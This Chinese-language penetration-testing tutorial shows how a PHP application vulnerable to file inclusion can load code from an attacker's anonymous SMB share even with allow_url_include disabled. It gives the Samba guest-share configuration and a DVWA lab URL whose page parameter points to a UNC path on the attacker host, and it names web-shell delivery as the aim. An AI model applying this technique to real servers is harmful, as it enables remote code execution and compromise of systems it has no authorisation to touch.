***No.1  
***

***前言***

在PHP配置文件中，即使“allow\_url\_include”和“allow\_url\_fopen”都设置为“Off”，PHP也不会阻止加载SMB URL。而这就极有可能被滥用来从SMB共享加载远程托管的PHP Web shell。

  

***No.2  
***

***攻击场景概述***

当易受攻击的PHP应用程序代码尝试从受攻击者控制的SMB共享加载PHP Web shell时，SMB共享应允许访问该文件。攻击者需要在其上配置具有匿名浏览访问权限的SMB服务器。因此，一旦易受攻击的应用程序尝试从SMB共享访问PHP Web shell，SMB服务器将不会要求任何的凭据，易受攻击的应用程序将包含Web shell的PHP代码。

  

***No.3  
***

***PHP环境设置***

  

确保受攻击目标机器上的“allow\_url\_fopen”和“allow\_url\_include”设置为“Off”此时则无法实现远程文件包含。

***No.4  
***

***在攻击机上搭建Samba服务器（kali-ux）***

安装Samba服务器：  
apt-get install samba  
创建SMB共享目录：

![](../Images/a36929fea1ff7ee7c1e809c8ec33d2d2.png)

配置新创建的SMB共享目录的权限：

![](../Images/12a4625324e1b2128e36732f392597f6.png)![](../Images/e5ae3425fd0084be72b979bd99bd1c9e.png)

删除SAMBA服务器配置文件的默认内容。

![](../Images/3c304705d47aae084e9a492597cee5b1.png)

将以下内容添加到/etc/samba/smb.conf文件。  
\[global\]  
workgroup = WORKGROUP  
server string = Samba Server %v  
netbios name = indishell-lab  
security = user  
map to guest = bad user  
name resolve order = bcast host  
dns proxy = no  
bind interfaces only = yes

\[ica\]  
path = /var/www/html/pub  
writable = no  
guest ok = yes  
guest only = yes  
read only = yes  
directory mode = 0555  
force user = nobody  
重启SAMBA服务器以使配置文件/etc/samba/smb.conf中的新配置生效。  
service smbd restart  
成功重启SAMBA服务器后，尝试访问SMB共享并确保SAMBA服务器不要求提供凭据。

![](../Images/8783abb3622cd80e6de18ebd1a45d76a.png)![](../Images/4afb6ed188de53f5c9426d01e5a9805e.png)

***No.5  
***

***至此SMB服务器已经配置完成***

现在，将PHP phpinfo托管在目录“/var/www/html/pub”中，该目录为smb共享目录“ica”。

![](../Images/98e3e38e35e8cacd075c816e29d70a56.png)

成功托管PHP phpinfo后，使用Windows访问SMB共享目录“ica”进行验证。  
可以看到php phpinfo存在于smb共享目录中。

![](../Images/5fd88ea057a40579f84142990ce5effe.png)

利用文件包含易受攻击的参数  
使用这个PHP phpinfo SMB链接，以及易受攻击的php代码浏览它,至此完成。  
http://192.168.100.45/dvwa/vulnerabilities/fi/?page=\\192.168.100.61\\ica\\phpinfo.php
